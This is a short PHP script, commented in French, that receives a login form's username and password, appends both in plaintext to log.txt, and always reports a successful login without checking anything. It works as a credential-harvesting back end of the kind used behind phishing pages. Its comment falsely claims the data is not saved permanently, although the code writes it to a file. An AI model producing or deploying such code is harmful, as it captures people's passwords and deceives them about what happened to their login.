<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // Affiche les informations soumises dans le fichier de log (sans les sauvegarder de manière permanente)
    file_put_contents('log.txt', "Nom d'utilisateur: $username - Mot de passe: $password\n", FILE_APPEND);
    
    // Redirection vers une autre page ou un message de succès
    echo "Connexion réussie, bienvenue !";
    // header('Location: votre_page_accueil.php');  // Décommentez pour rediriger
}
?>
